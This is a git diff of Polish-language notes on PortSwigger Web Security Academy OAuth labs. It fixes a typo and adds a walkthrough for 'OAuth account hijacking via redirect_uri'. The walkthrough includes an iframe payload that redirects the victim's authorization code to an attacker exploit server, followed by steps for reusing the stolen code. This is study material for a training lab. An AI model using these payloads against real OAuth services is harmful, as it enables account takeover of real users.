@@ -588,4 +588,17 @@ param=bad-stuff-here
 ```
 <iframe src="https://0a4d004f04cb3a63c0382da90041006d.web-security-academy.net/oauth-linking?code=aKsHIS3bGFzKEN-EDD0918bQIjTaeSLtw0mmnW4v8e8"> </iframe>
 ```
-6. Następnie logujemy się przez konto społecznościowe i zostajemy przekierowani na konto administracyjne, skąd usówamy carlosa
+6. Następnie logujemy się przez konto społecznościowe i zostajemy przekierowani na konto administracyjne, skąd usuwamy carlosa
+
+## Lab: OAuth account hijacking via redirect_uri
+1. Logujemy się przez konto na mediach społecznościowych.
+2. Teraz po wylogowaniu nie musimy już wpisywać loginu ani hasła, a wystarczy nacisnąć przycisk logowania i jesteśmy uwierzytelniani.
+3. Ostatecznie jesteśmy logowani, poprzez przekierowanie na `[adres_strony]/oath-callback?code=[tajny_token]`
+4. Jesteśmy zatem w stanie zalogować się na dowolne konto posiadając taki token do niego przypisany (pod warunkiem, że nie został już użyty).
+5. Wysyłając poprzednie zapytanie do Burp Reapeatera możemy zauważyć, że [strona] jest pobierana z wysyłanej wartości redirect_uri
+6. Konstruujemy zatem payload, jest to to samo zapytanie jednak z podmienioną wartością redirect_uri wskazującą na nasz serwer, przez co zostanie wysłane na niego zapytanie z wartością token u
+7. Payload
+```
+<iframe src="https://YOUR-LAB-OAUTH-SERVER-ID.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net&response_type=code&scope=openid%20profile%20email"></iframe>
+```
+8. Przechodzimy przez qproces logowania i w momencie zapytanie z `/oauth-callback` podmieniamy tokeny
